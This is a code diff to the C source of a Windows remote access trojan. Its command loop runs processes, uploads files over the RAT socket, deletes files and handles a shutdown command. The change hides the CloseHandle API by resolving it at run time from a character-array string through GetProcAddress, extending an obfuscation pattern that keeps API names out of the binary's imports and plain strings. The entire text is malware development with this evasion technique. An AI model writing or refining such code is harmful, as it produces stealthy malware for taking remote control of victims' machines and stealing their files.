@@ -21,6 +21,7 @@ typedef UINT _GetSystemDirectoryA(LPSTR lpBuffer, UINT uSize);
 typedef DWORD _GetTempPathA(DWORD nBufferLength, LPSTR lpBuffer);
 typedef BOOL _CreateProcessA(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
 typedef DWORD _WaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds);
+typedef BOOL _CloseHandle(HANDLE hObject);
 
 #define SOCKET_BUFFER_SIZE 256
 #define SPLIT_STRING_ARRAY_SIZE 16
@@ -325,8 +326,10 @@ WinMain(HINSTANCE hInstance,
 			_WaitForSingleObject* f_WaitForSingleObject = (_WaitForSingleObject*)GetProcAddress(libraryKernel32, ca_WaitForSingleObject);
 			f_WaitForSingleObject( pi.hProcess, INFINITE );
 
-			CloseHandle(pi.hProcess);
-			CloseHandle(pi.hThread);
+			char ca_CloseHandle[] = { 'C','l','o','s','e','H','a','n','d','l','e',0 };
+			_CloseHandle* f_CloseHandle = (_CloseHandle*)GetProcAddress(libraryKernel32, ca_CloseHandle);
+			f_CloseHandle(pi.hProcess);
+			f_CloseHandle(pi.hThread);
 
 			SocketUploadFile(&ratSocket, filePath);
 
@@ -337,7 +340,7 @@ WinMain(HINSTANCE hInstance,
 				OutputDebugStringA("Error deleting file at");
 				OutputDebugStringA(filePath);
 			}
-			CloseHandle(handle);
+			f_CloseHandle(handle);
 		}
 		else if ( strcmp(splittedCommand[0], ca_shutdown) == 0 )
 		{
